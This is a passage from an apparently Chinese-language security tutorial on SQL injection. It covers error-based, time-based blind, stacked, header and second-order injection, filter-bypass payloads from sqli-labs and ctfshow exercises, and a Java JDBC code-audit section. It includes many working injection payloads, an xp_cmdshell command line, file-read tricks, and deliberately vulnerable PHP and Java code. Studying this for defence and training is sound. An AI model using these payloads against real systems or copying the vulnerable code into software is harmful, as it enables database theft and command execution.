1<br>第二个参数：<code>XPath_string</code> (Xpath 格式的字符串)<br>第三个参数：<code>new_value</code>，String 格式，替换查找到的符合条件的数据</p><h4 id="格式-1"><a href="#格式-1" class="headerlink" title="格式"></a>格式</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,version,<span class="number">0</span>)#</span><br><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="Floor报错注入"><a href="#Floor报错注入" class="headerlink" title="Floor报错注入"></a>Floor报错注入</h3><p>MYSQL中用来取整的函数</p><h4 id="参数-2"><a href="#参数-2" class="headerlink" title="参数"></a>参数</h4><p><strong>FLOOR(x)</strong></p><p>返回小于或等于 x 的最大整数（向下取整）</p><h4 id="格式-2"><a href="#格式-2" class="headerlink" title="格式"></a>格式</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">2</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(version(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat_ws(<span class="string">&#x27;-&#x27;</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),(<span class="keyword">select</span> database()),<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>)) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a<span class="comment">--+</span></span><br></pre></td></tr></table></figure><h3 id="insert-update-delete注入的利用"><a href="#insert-update-delete注入的利用" class="headerlink" title="insert update delete注入的利用"></a>insert update delete注入的利用</h3><h4 id="判断方式"><a href="#判断方式" class="headerlink" title="判断方式"></a>判断方式</h4><ol><li>数据包括<code>&#39;</code>或者 <code>\</code>时，数据无法插入，则80%是注入，20%是被拦截规则拦截掉了</li><li>带入数据库的字符串是用<code>&#39;</code>包裹的，测试数据中带有<code>&quot;</code>，如果能插入数据则90%是注入(<code>&quot;</code>不影响数据库执行的sql语句的闭合。往数据库里面插入双引号会变成单引号)。</li><li>数据中包含<code>\&#39;</code> 如果能插入数据，则 100% 证明存在注入</li><li>如果是数字参数，插入<code>sleep(5)</code>进行判断<code>_name=te1st&amp;_number=-1&#39; and sleep(5)or&#39;1&amp;_owner=Olivia</code></li></ol><p>环境代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sqltest.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//error_reporting(E_ALL ^ E_DEPRECATED);</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;./config.php&#x27;</span>);</span><br><span class="line"><span class="variable">$conn</span>=mysql_connect(<span class="variable">$mysql_server_name</span>,<span class="variable">$mysql_username</span>,<span class="variable">$mysql_password</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;error connecting&quot;</span>) ; <span class="comment">//连接数据库</span></span><br><span class="line"></span><br><span class="line">mysql_query(<span class="string">&quot;set names &#x27;utf8&#x27;&quot;</span>); <span class="comment">//数据库输出编码 应该与你的数据库编码保持一致.</span></span><br><span class="line"></span><br><span class="line">mysql_select_db(<span class="variable">$mysql_database</span>); <span class="comment">//打开数据库</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_id</span>=<span class="variable">$_POST</span>[id];</span><br><span class="line"><span class="variable">$_ney</span>=<span class="string">&quot;test123&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot; insert into member__sq(p_name,p_number,p_owner,p_ney,sqdate) values(</span></span><br><span class="line"><span class="string">&#x27;<span class="subst">&#123;$_POST[_name]&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$_POST[_number]&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$_POST[_owner]&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$_ney&#125;</span>&#x27;) &quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="comment">//insert into member__sq(p_name,p_number,p_owner,p_ney,sqdate) values(&#x27;te1st&#x27;,&#x27;51&#x27;,&#x27;me&#x27;,&#x27;test123&#x27;) and 1=1//&#x27;,&#x27;1511233968&#x27;) </span></span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>,<span class="variable">$conn</span>);</span><br><span class="line"><span class="keyword">if</span>(mysql_affected_rows()==<span class="string">&quot;-1&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>  <span class="string">&quot;&lt;br&gt;&quot;</span>.mysql_error();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;sucess!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$mysql_server_name</span>=<span class="string">&#x27;127.0.0.1&#x27;</span>; <span class="comment">//改成自己的mysql数据库服务器</span></span><br><span class="line"><span class="variable">$mysql_username</span>=<span class="string">&#x27;root&#x27;</span>; <span class="comment">//改成自己的mysql数据库用户名</span></span><br><span class="line"><span class="variable">$mysql_password</span>=<span class="string">&#x27;phpstudyadmin&#x27;</span>; <span class="comment">//改成自己的mysql数据库密码</span></span><br><span class="line"><span class="variable">$mysql_database</span>=<span class="string">&#x27;security&#x27;</span>; <span class="comment">//改成自己的mysql数据库名</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>基于insert下的报错，其他同理：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210829112841443.png" alt="image-20210829112841443"></p><blockquote><p>这里相当于在闭合引号也可以写成<code>owner=Olivia&#39; or updatexml(1,concat(0x7e,user(),0x7e),1) or &#39;1</code></p></blockquote><h4 id="猜测增删改列的个数-，利用成功执行注入"><a href="#猜测增删改列的个数-，利用成功执行注入" class="headerlink" title="猜测增删改列的个数 ，利用成功执行注入"></a>猜测增删改列的个数 ，利用成功执行注入</h4><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210828220950419.png" alt="image-20210828220950419"></p><p>基于insert下的select：</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20221014165446560.png" alt="image-20221014165446560"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20221014165513080.png" alt="image-20221014165513080"></p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>时间注入利用<code>sleep()</code>和<code>benchmark()</code>等函数让sql语句执行时间更长</p><h3 id="判断是否存在时间盲注"><a href="#判断是否存在时间盲注" class="headerlink" title="判断是否存在时间盲注"></a>判断是否存在时间盲注</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and sleep(5)</span><br></pre></td></tr></table></figure><h3 id="sleep函数判断页面响应时间"><a href="#sleep函数判断页面响应时间" class="headerlink" title="sleep函数判断页面响应时间"></a>sleep函数判断页面响应时间</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#if(判断条件，为true时执行，为false时执行)</span><br><span class="line">and if(ascii(substring(database(),1,1))&lt;100,1,sleep(5))</span><br><span class="line">and if(substring(database(),1,1)=&#x27;a&#x27;,sleep(3),null)</span><br><span class="line">#Benchmark() 函数，它是用于测试性能的。 Benchmark(count,expr) ，这个函数执行的结果，是将表达式 expr 执行 count 次</span><br><span class="line">benchmark(100000000,md(5))</span><br><span class="line"># 其他数据库</span><br><span class="line">PostgreSQL</span><br><span class="line">PG_sleep(5)</span><br><span class="line">Generate_series(1,1000000)</span><br><span class="line">SQLServer</span><br><span class="line">waitfor delay  &#x27;0:0:5&#x27;</span><br></pre></td></tr></table></figure><h3 id="payload-a"><a href="#payload-a" class="headerlink" title="payload a"></a>payload a</h3><p><code>(select * from (select user())a)</code></p><p>1、先查询 select user() 这里面的语句，将这里面查询出来的数据作为一个结果集 取名为 a<br>2、然后 再 select * from a 查询a ,将 结果集a 全部查询出来</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> sleep(<span class="number">2</span>))a)</span><br><span class="line">(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span>(if (length(database())<span class="operator">&gt;</span><span class="number">1</span>, sleep(<span class="number">3</span>),<span class="number">0</span>)))a)</span><br><span class="line">(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span>(if(substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span>,sleep(<span class="number">3</span>),<span class="number">1</span>)))a)(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span>(if(length(database())<span class="operator">&gt;</span><span class="number">2</span>,sleep(<span class="number">3</span>),<span class="number">0</span>)))a)</span><br></pre></td></tr></table></figure><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><h3 id="union注入和堆叠注入的区别"><a href="#union注入和堆叠注入的区别" class="headerlink" title="union注入和堆叠注入的区别"></a>union注入和堆叠注入的区别</h3><p><code>union</code>或者<code>union all</code>执行的语句类型是有限的，可以用来执行查询语句，且在 MySQL 中返回的列数需要相等；而堆叠注入可以执行的是任意的语句。</p><h3 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h3><p>堆叠注入并不是在每一个环境下都可以执行，可能受到 API 或者数据库引擎不支持的限制，同时权限不足也会使攻击者无法修改数据或者调用一些程序。<br>虽然前面提到了堆叠查询可以执行任意的 SQL 语句，但是这种注入方式并不是十分完美。在我们的 Web 系统中，代码通常<strong>只返回一个查询结果</strong>，因此堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面无法看到返回结果。<br>因此在读取数据时，建议使用<code>union</code>注入。同时在使用堆叠注入之前，我们也需要知道一些数据库相关信息如表名，列名等。</p><h3 id="数据库实例"><a href="#数据库实例" class="headerlink" title="数据库实例"></a>数据库实例</h3><p>下面介绍几个常用数据库的堆叠操作：基本操作与增删查改。</p><h4 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h4><ol><li>新建表<code>test</code><br><code>select * from users where id=1;create table test like users;</code></li><li>删除新建表<code>test</code><br><code>select * from users where id=1;drop table test;</code></li><li>查询数据<br><code>select * from users where id=1;select 1,2,3;</code></li><li>加载文件<br><code>select * from users where id=1;select load_file(&#39;d:/test.php&#39;);</code></li><li>修改数据<br><code>select * from users where id=1;insert into users(id,username,password) values(&#39;100&#39;,&#39;name&#39;,&#39;pswd&#39;);</code></li></ol><p><strong>load_file()函数</strong></p><ul><li>读取文件并返回文件内容为字符串。</li><li>要使用此函数，<strong>文件必须位于服务器主机</strong>上，必须指定<strong>完整路径</strong>的文件，而且必须有<strong>FILE权限</strong>；该文件<strong>所有字节可读</strong>，但文件<strong>内容必须小于</strong><code>max_allowed_packet</code></li><li>如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回<code>NULL</code></li></ul><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210829150420743.png" alt="image-20210829150420743"><br><strong>注意：</strong>这里还是有数据导入导出权限的问题。</p><p><strong>secure-file-priv字段</strong> ： <code>secure-file-priv</code>参数是用来限制<code>LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE()</code>传到哪个指定目录的。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span></span><br><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure><ul><li><code>ure_file_priv</code>的值为<code>null</code> ，表示限制mysqld 不允许导入|导出</li><li>当<code>secure_file_priv</code>的值为<code>/tmp/</code> ，表示限制mysqld 的导入|导出只能发生在<code>/tmp/</code>目录下</li><li>当<code>secure_file_priv</code>的值没有具体值时，表示不对mysqld 的导入|导出做限制</li></ul><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210829151716423.png" alt="image-20210829151716423"></p><blockquote><p>默认的为NULL。即不允许导入导出。</p><p>修改mysql.ini 文件，在[mysqld] 下加入</p><p>secure_file_priv =</p><p>保存，重启mysql。</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210829152519639.png" alt="image-20210829152519639"></p><p>再次执行</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210829154142239.png" alt="image-20210829154142239"></p><blockquote><p>在navicat中执行就会是这样的，要换做命令行执行</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210829154119940.png" alt="image-20210829154119940"></p><p><strong>注意：</strong>在 MySQL 中，需要注意路径转义的问题，即用<code>/</code>或<code>\\</code>分隔。</p><p><a href="https://www.cnblogs.com/devcjq/articles/6409470.html">MySQL里设置或修改系统变量的几种方法</a></p><p>这里有修改系统变量的几种方法，可以考虑注入时涉及文件操作时先修改权限。</p><h4 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a>SQL Server</h4><ol><li>新建表<br><code>select * from test;create table test2(ss CHAR(8));</code></li><li>删除新建表<br><code>select * from test;drop table test2;</code></li><li>查询数据<br><code>select * from test;select 1,2,3;</code></li><li>修改数据<br><code>select * from test;update test set name=&#39;name&#39; where id=1;</code></li><li>SQL Server中最为重要的存储过程的执行<br><code>select * from test where id=1;exec master..xp_cmdshell &#39;ipconfig&#39;</code></li></ol><h4 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h4><p><strong>Oracle 不能使用堆叠注入</strong>，可以从图中看到，当有两条语句在同一行时，直接报错无效字符。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210829154707616.png" alt="image-20210829154707616"></p><h4 id="Postgresql"><a href="#Postgresql" class="headerlink" title="Postgresql"></a>Postgresql</h4><ol><li>新建表<br><code>select * from user_test;create table user_data(id DATE);</code></li><li>删除新建表<br><code>select * from user_test;delete from user_data;</code></li><li>查询数据<br><code>select * from user_test;select 1,2,3;</code></li><li>修改数据<br><code>select * from user_test;update user_test set name=&#39;new&#39; where name=&#39;name&#39;;</code></li></ol><h5 id="注入过程"><a href="#注入过程" class="headerlink" title="注入过程"></a>注入过程</h5><p>堆叠注入需要依靠前文所写的各种注入方式来获取数据库的信息，在这里只演示如何插入新的数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`http://localhost:8088/sqlilabs/Less-38/?id=1&#x27;;insert into users(id,username,password) values(38,&#x27;Less38&#x27;,&#x27;Less38&#x27;)--+`</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20210829154911637.png" alt="image-20210829154911637"></p><h2 id="特殊注入点"><a href="#特殊注入点" class="headerlink" title="特殊注入点"></a>特殊注入点</h2><h3 id="Http-Header注入"><a href="#Http-Header注入" class="headerlink" title="Http Header注入"></a>Http Header注入</h3><p>后台开发人员为了验证客户端头信息（比如常用的cookie验证）或者通过<code>http header</code>头信息获取客户端的一些信息，比如<code>useragent</code>,<code>accept</code>字段等等。<br>会对客户端的<code>http header</code>信息进行获取并使用SQL进行处理，如果此时没有足够的安全考虑则可能会导致基于<code>http header</code>的SQL注入漏洞。</p><h3 id="错误-POST-User-Agent-请求头注入"><a href="#错误-POST-User-Agent-请求头注入" class="headerlink" title="错误_POST_User-Agent_请求头注入"></a>错误_POST_User-Agent_请求头注入</h3><p><code>&#39; or updatexml(1 , concat(&#39;#&#39;,(database())),0) , &#39;&#39;,&#39;&#39;) #</code></p><p><strong>注意</strong>：这里并不是URL而是HTTP头，所以<code>+</code>并不会被转义为(空格)，于是末尾的注释符号要变为<code>#</code></p><h3 id="错误-POST-Referer-请求头注入"><a href="#错误-POST-Referer-请求头注入" class="headerlink" title="错误_POST_Referer_请求头注入"></a>错误_POST_Referer_请求头注入</h3><p><code>&#39; or updatexml(1,concat(&#39;#&#39;, (database())),0), 0)#</code></p><h3 id="二次注入（存储型注入）"><a href="#二次注入（存储型注入）" class="headerlink" title="二次注入（存储型注入）"></a>二次注入（存储型注入）</h3><p>导致 SQL 注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就可以触发 SQL 注入</p><h4 id="二次注入的一般过程："><a href="#二次注入的一般过程：" class="headerlink" title="二次注入的一般过程："></a>二次注入的一般过程：</h4><ol><li>通过构造数据的形式，在浏览器或者其他软件中提交 HTTP 数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了构造的 SQL 语句或者命令。</li><li>服务端应用程序会将提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。</li><li>向服务端发送第二个与第一次不相同的请求数据信息。</li><li>服务端接收到提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致在第一次请求中构造的 SQL 语句或者命令在服务端环境中执行。</li><li>服务端返回执行的处理结果数据信息，便可以通过返回的结果数据信息判断二次注入漏洞利用是否成功。</li></ol><h4 id="当登录界面对username和password都做了过滤"><a href="#当登录界面对username和password都做了过滤" class="headerlink" title="当登录界面对username和password都做了过滤"></a>当登录界面对username和password都做了过滤</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line"><span class="variable">$password</span> = mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>]);</span><br></pre></td></tr></table></figure><p><strong>当注入点在修改密码处：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=<span class="string">&#x27;$pass&#x27;</span> WHERE username=<span class="string">&#x27;$username&#x27;</span> <span class="keyword">and</span> password=<span class="string">&#x27;$curr_pass&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>将其改变为：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=<span class="string">&#x27;$pass&#x27;</span> WHERE username=<span class="string">&#x27;$username&#x27;</span>-- <span class="keyword">and</span> password=<span class="string">&#x27;$curr_pass&#x27;</span></span><br></pre></td></tr></table></figure><p>且已知注册时未有任何过滤，闭合查询语句为单引号，即在注册用户时构造<code>admin&#39;--</code> (有空格)或<code>admin&#39;#</code>。</p><h1 id="过滤和应对手段"><a href="#过滤和应对手段" class="headerlink" title="过滤和应对手段"></a>过滤和应对手段</h1><p><a href="https://dev.mysql.com/doc/refman/5.7/en/">https://dev.mysql.com/doc/refman/5.7/en/</a></p><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>注释<code>/**/</code> 反引号(`)</p><p> 换行<code>%0b</code>,<code>%0a</code>,<code>%0c</code>,<code>%09</code> 代替 TAB 键（php 可用）</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20220909162346080.png" alt="image-20220909162346080"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;union%0aselect/**/1,group_concat(password),3/**/from`ctfshow_user`%23</span><br></pre></td></tr></table></figure><h2 id="没过滤"><a href="#没过滤" class="headerlink" title="没过滤()"></a>没过滤<code>()</code></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> preg_match(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用and的优先级比or大</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or(username=&#x27;flag&#x27;)and&#x27;1&#x27;=&#x27;1</span><br><span class="line">where username !=&#x27;flag&#x27; and id = &#x27;&#x27;or(username=&#x27;flag&#x27;)and&#x27;1&#x27;=&#x27;1&#x27; limit 1;&quot;;//左边为0但是右边是1</span><br></pre></td></tr></table></figure><h2 id="制定输入内容过滤（存在xxx不显示）"><a href="#制定输入内容过滤（存在xxx不显示）" class="headerlink" title="制定输入内容过滤（存在xxx不显示）"></a>制定输入内容过滤（存在xxx不显示）</h2><p>like&amp;regexp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username like&#x27;%fla%</span><br><span class="line">(ctfshow_user)where(pass)like&#x27;&#123;0&#125;%&#x27;</span><br></pre></td></tr></table></figure><p>where</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;select count(pass) from &quot;.$_POST[&#x27;tableName&#x27;].&quot;;&quot;;</span><br><span class="line">tableName=`ctfshow_user`where`pass`regexp(&quot;ctfshow&#123;4&quot;)</span><br></pre></td></tr></table></figure><h3 id="单双引号过滤（Hexadecimal）"><a href="#单双引号过滤（Hexadecimal）" class="headerlink" title="单双引号过滤（Hexadecimal）"></a>单双引号过滤（Hexadecimal）</h3><p>group by having</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tableName=ctfshow_user group by pass having pass regexp(0x63746673686f777b)</span><br><span class="line">tableName=ctfshow_user group by pass having pass like &#123;0&#125;.format(&quot;0x&quot;+str_to_hex(flag+&quot;%&quot;))</span><br><span class="line">tableName=ctfshow_user a inner join ctfshow_user b on b.pass like 0x63746673686f7725</span><br></pre></td></tr></table></figure><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><h3 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h3><h4 id="Statement"><a href="#Statement" class="headerlink" title="Statement"></a>Statement</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 采用原始的Statement拼接语句，导致漏洞产生</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">jdbcVul</span><span class="params">(String id)</span> </span>&#123;</span><br><span class="line">    StringBuilder result = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">        Connection conn = DriverManager.getConnection(db_url, db_user, db_pass);</span><br><span class="line"></span><br><span class="line">        Statement stmt = conn.createStatement();</span><br><span class="line">        <span class="comment">// 拼接语句产生SQL注入</span></span><br><span class="line">        String sql = <span class="string">&quot;select * from users where id = &#x27;&quot;</span> + id + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">        ResultSet rs = stmt.executeQuery(sql);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">            String res_name = rs.getString(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">            String res_pass = rs.getString(<span class="string">&quot;pass&quot;</span>);</span><br><span class="line">            String info = String.format(<span class="string">&quot;查询结果 %s: %s&quot;</span>, res_name, res_pass);</span><br><span class="line">            result.append(info);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h4 id="PrepareStatement"><a href="#PrepareStatement" class="headerlink" title="PrepareStatement"></a>PrepareStatement</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PrepareStatement会对SQL语句进行预编译，但有时开发者为了便利，直接采取拼接的方式构造SQL，此时进行预编译也无用。</span></span><br><span class="line">Connection conn = DriverManager.getConnection(db_url, db_user, db_pass);</span><br><span class="line">String sql = <span class="string">&quot;select * from users where id = &quot;</span> + id;</span><br><span class="line">PreparedStatement st = conn.prepareStatement(sql);</span><br><span class="line">System.out.println(<span class="string">&quot;[*] 执行SQL语句：&quot;</span> + st);</span><br><span class="line">ResultSet rs = st.executeQuery();</span><br></pre></td></tr></table></figure><h4 id="安全代码"><a href="#安全代码" class="headerlink" title="安全代码"></a>安全代码</h4><h5 id="过滤关键字符"><a href="#过滤关键字符" class="headerlink" title="过滤关键字符"></a>过滤关键字符</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 采用黑名单过滤危险字符，同时也容易误伤（次方案）</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">checkSql</span><span class="params">(String content)</span> </span>&#123;</span><br><span class="line">    String black = <span class="string">&quot;&#x27;|;|--|+|,|%|=|*|(|)|like|xor|and|or|exec|insert|select|delete|update|count|drop|chr|mid|master|truncate|char|declare｜sleep|abs|rand|union&quot;</span>;</span><br><span class="line">    String[] black_list = black.split(<span class="string">&quot;|&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span> ; i &lt; black_list.length ; i++ )&#123;</span><br><span class="line">        <span class="keyword">if</span> (content.contains(black_list[i]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        